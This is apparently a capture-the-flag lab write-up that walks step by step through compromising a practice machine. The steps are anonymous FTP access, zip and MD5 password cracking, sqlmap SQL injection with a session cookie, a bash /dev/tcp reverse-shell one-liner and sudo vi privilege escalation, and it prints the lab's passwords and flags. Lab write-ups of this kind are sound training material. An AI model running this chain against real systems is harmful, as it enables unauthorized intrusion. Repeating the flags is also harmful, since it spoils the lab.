## **Machine IP** 
> 10.129.78.227
## **Inference**
1. Nmap scan shows `ftp` running on port `21`
2. *Anonymous* login allowed.
3. Logined to ftp with `ftp 10.129.78.227`
		```
		Username: Anonymous
		Password:{Anything}
		```
4. Found `backup.zip` file in the ftp. Downloades file with `get backup.zip`.
5. File is protected with password for unzipping.
6. Used `zip2john` to find hash by `zip2john backup.zip > hashes` and saved in a file named `hashes`.
7. Then used `john` to crack hash with `john --wordlist=/usr/share/wordlists/rockyou.txt hashes` 
8. After password being cracked we will view it by `john --show hashes`.
9. Password found out to be *741852963*.
10. Found a password as hash- `2cb42f8734ea607eefed3b70af13bbd3` in index.php.
11. Used `hashid` to check type of hash using MD5 fisrt.
12. Saved hash in file named hash_password.
13. Used hashcat to find password by `hashcat -o 0 -a 0 hash_password /usr/share/wordlists/rockyou.txt`.
14. Found password as **qwerty789**.
15. Opened website on port 80 with `IP- 10.129.78.227`.
16. Found a login page.
17. Used username and password found in index.php.
18. Logged in as admin.
19. Use *sqlmap* to find vulnerabilities by `sqlmap -u "http://10.129.78.227/dashboard.php?search=any+query" --cookie="PHPSESSID=7f5fg9qg93no9up5v2h0564dmh"` used cokkie to log in as admin while testing.
20.  Found out that target is vulnerable to sql injection.
21. Again used sql-map but this time with `--os-shell` argument: `sqlmap -u "http://10.129.78.227/dashboard.php?search=any+query" --cookie="PHPSESSID=7f5fg9qg93no9up5v2h0564dmh" --os-shell`
22. Opened a netcat listener.
23. Got a stable-shell with payload
		```bash
		bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
		```
24. Stabalized the shell
25. Found user flag in `/var/lib/postgresql`.
26. Found a password in `dashboard.php` :- `P@s5w0rd!`.
27. Logined in ssh via this password. 
28. Still we are not root,
29. We will see what sudo previleges we have by `sudo -l`. It shows that we can run vi as root. We will go to https://gtfobins.github.io/gtfobins/vi/#sudo and see what we can to with binaries.
30. According to the website we can do `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf` then in vi editor 
```vi
:set shell=/bin/sh
:shell
```
31. Got root flag in `/root `.

## **RESULT**
```
Root flag:dd6e058e814260bc70e9bbdef2715849
User flag:ec9b13ca4d6229cd5cc1e09980965bf7
```